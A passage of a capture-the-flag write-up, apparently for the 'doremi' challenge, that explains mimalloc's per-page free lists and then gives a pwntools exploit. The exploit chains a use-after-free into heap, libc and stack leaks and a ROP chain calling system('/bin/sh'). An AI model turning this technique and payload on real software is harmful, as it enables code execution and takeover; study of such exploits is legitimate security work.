    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Free list sharding is the core trick that makes <strong>mimalloc</strong> so fast. Instead of one big free list per size class, each page in mimalloc (usually 64 KiB) keeps its <strong>own set of three free lists</strong>. This keeps allocations local to a page, improves cache performance, and avoids multi-thread contention.</p>
<ol>
<li><strong>The Allocation Free List (<code>page-&gt;free</code>)</strong>
<ul>
<li><strong>Purpose:</strong> This is the main list that <code>malloc</code> pulls from. When your program requests memory, mimalloc just pops a block from this list. Think of it as the “ready-to-go” stash of chunks.</li>
</ul>
</li>
<li><strong>The Local Free List (<code>page-&gt;local_free</code>)</strong>
<ul>
<li><strong>Purpose:</strong> When a thread frees a block it allocated itself (a <em>local free</em>), the block goes here instead of immediately returning to the allocation list. The idea is that after a fixed number of allocations, mimalloc will swap this list back into the main free list in bulk. This gives it a predictable “heartbeat” to run maintenance tasks like deferred frees, without slowing down the fast path.</li>
</ul>
</li>
<li><strong>The Thread-Free List (<code>page-&gt;thread_free</code>)</strong>
<ul>
<li><strong>Purpose:</strong> This handles the tricky case where one thread frees memory that another thread allocated. To avoid contention and expensive locking, the freed block is atomically pushed onto this list. Later, mimalloc collects the whole batch at once and merges it into the main free list.</li>
</ul>
</li>
</ol>
<p>In short: instead of juggling one global list per size, mimalloc shards its free lists <em>per page</em> and splits them into <strong>three roles</strong>. That way, local allocations are fast, remote frees don’t bottleneck, and maintenance is neatly amortized.</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/doremi/heaplayout.png' alt="HeapLayout"></p>
<pre><code>                                                    Heap Layout
</code></pre>
<p>In our case, the <strong>Allocation Free List</strong> (<code>page-&gt;free</code>) can hold up to <strong>32 chunks</strong> at a time. That means mimalloc can serve 32 allocations straight from this list without doing anything else.</p>
<p>Here’s the flow:</p>
<ul>
<li>If you free a block of a given size (say, 128 bytes) and then immediately request another 128-byte block, mimalloc will just hand it back to you from the <strong>allocation free list</strong> — as long as it’s not empty.</li>
<li>Once this list becomes empty , mimalloc switches to the <strong>slow path</strong> (<code>malloc_generic</code>). This slow path first transfers any blocks waiting in the <strong>Local Free List</strong> into the Allocation Free List, and then continues serving allocations from there.</li>
</ul>
<hr>
<h2 class="heading-element" id="getting-leaks"><span>Getting Leaks</span>
  <a href="#getting-leaks" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Getting a (mimalloc)<strong>heap leak</strong>  is pretty straightforward. Since mimalloc stores its free list as a linked list (with the next pointer placed right at the start of each freed chunk) <code>similar to glibc</code>, reading the freed chunk will leak a <strong>heap address</strong> directly.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">######################### heap leak ##########################</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">))</span></span></span></code></pre></td></tr></table>
</div>
</div><p>For a <strong>libc leak</strong>, we can use a technique similar to <strong>tcache poisoning</strong>. Mimalloc, just like tcache, keeps the linked list pointer at the start of every freed chunk. With a use-after-free bug, we can overwrite that pointer.</p>
<p>At this point, we only have a <strong>heap leak</strong>, so the next move is to craft a <strong>fake chunk</strong> somewhere inside the mimalloc memory segment or pages itself. Remember, every mimalloc segment also contains a region reserved for <strong>metadata</strong>, which is read-write accessible.This metadata doesn’t just store allocator info — it also contains some <strong>libc pointers</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">################## leak libc address ###############################</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_leak</span><span class="o">+</span><span class="mh">0x5980a000160</span><span class="o">+</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="o">-</span><span class="mh">0x5980a010080</span><span class="p">))</span> <span class="c1">#overwriting the next pointer of local free list</span>
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">31</span><span class="p">):</span> <span class="c1">#allocating 31 chunks</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#fake chunk allocated on free list</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span><span class="o">-</span><span class="mh">0x00007caf37884100</span><span class="o">+</span><span class="mh">0x7caf3788c000</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span></span></span></code></pre></td></tr></table>
</div>
</div><p>To set things up for later exploitation, I allocated a chunk that sits directly on the free lists. Close to it in memory, there’s also a libc pointer. So by reading this chunk, we get two wins at once: a <strong>libc leak</strong> and <strong>control of the free lists</strong> (the Allocation Free List and the Local Free List).</p>
<p><img loading="lazy" src='http://localhost:1313/d1ff/doremi/1f52789d-8511-4251-9ba1-3639b4ed4b8d.png' alt="mod_mi-pica.png"></p>
<hr>
<h2 class="heading-element" id="exploitation"><span>Exploitation</span>
  <a href="#exploitation" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>So far, we’ve got both a <strong>libc leak</strong> and a <strong>mimalloc heap leak</strong>. On top of that, we managed to allocate a chunk right on the free list itself, which gives us <strong>direct control over future allocations</strong>. From here, there are multiple ways to spawn a shell on remote. The approach I used was to <strong>write a ROP chain onto the stack</strong>, so that when the <code>update</code> function returns, execution jumps straight into the ropchain.</p>
<p>To pull this off, we first need a <strong>stack pointer</strong>. Libc provides one in <code>environ</code>, which always points to the current stack. By rewriting the Allocation Free List pointer to the address of <code>libc.environ</code>, the next allocation will hand us a chunk at that location. From there, we can simply read it to leak the <strong>stack address</strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">################################# stack leak #########</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x7da0fe9c6d60</span> <span class="o">-</span> <span class="mh">0x7da0fe922000</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_environ</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="c1">######################################################</span></span></span></code></pre></td></tr></table>
</div>
</div><p>From the challenge’s Docker instance, we can figure out the exact offset between the leaked stack address from <code>environ</code> and the return address of the <code>update</code> function. That offset turns out to be <strong>-0x70 bytes</strong>.</p>
<p>ow we just point the <strong>Allocation Free List head</strong> to the exact stack address we want (the return address of <code>update</code>). Then, by creating a new chunk, we can write our <strong>ROP chain</strong> directly onto the stack. When the <code>update</code> function finally returns, execution jumps straight into our chain — and we pop a shell. <strong>Boom!</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">###################### rop_chain ######################</span>
</span></span><span class="line"><span class="cl"><span class="n">ROP</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000014413</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000014126</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000501b0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)))</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">stack_leak</span><span class="o">-</span><span class="mh">0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Complete Exploitation Script</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chal_patched&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ld-musl-x86_64.so.1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">global</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;LD_PRELOAD&#39;</span><span class="p">:</span> <span class="s1">&#39;./libmimalloc.so.2.2&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./chal_patched&#39;</span><span class="p">,</span><span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;b *update&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># r = remote(&#39;doremi.chal.uiuc.tf&#39;, 1337, ssl=True)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;YAHNC&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Position? (0-15): &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">look</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;YAHNC&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Position? (0-15): &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;YAHNC&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Position? (0-15): &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;YAHNC&gt; &#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Position? (0-15): &#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Content? (127 max): &#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">######################### heap leak ##########################</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">################## leak libc address ###############################</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">heap_leak</span><span class="o">+</span><span class="mh">0x5980a000160</span><span class="o">+</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="o">-</span><span class="mh">0x5980a010080</span><span class="p">))</span> <span class="c1">#overwriting the next pointer of local free list</span>
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">31</span><span class="p">):</span> <span class="c1">#allocating 31 chunks</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#fake chunk allocated on free list</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span><span class="o">-</span><span class="mh">0x00007caf37884100</span><span class="o">+</span><span class="mh">0x7caf3788c000</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">################################# stack leak #########</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x7da0fe9c6d60</span> <span class="o">-</span> <span class="mh">0x7da0fe922000</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">libc_environ</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">look</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">),</span><span class="s1">&#39;all&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="c1">######################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">###################### rop_chain ######################</span>
</span></span><span class="line"><span class="cl"><span class="n">ROP</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000014413</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000014126</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x00000000000501b0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)))</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">stack_leak</span><span class="o">-</span><span class="mh">0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">pack</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
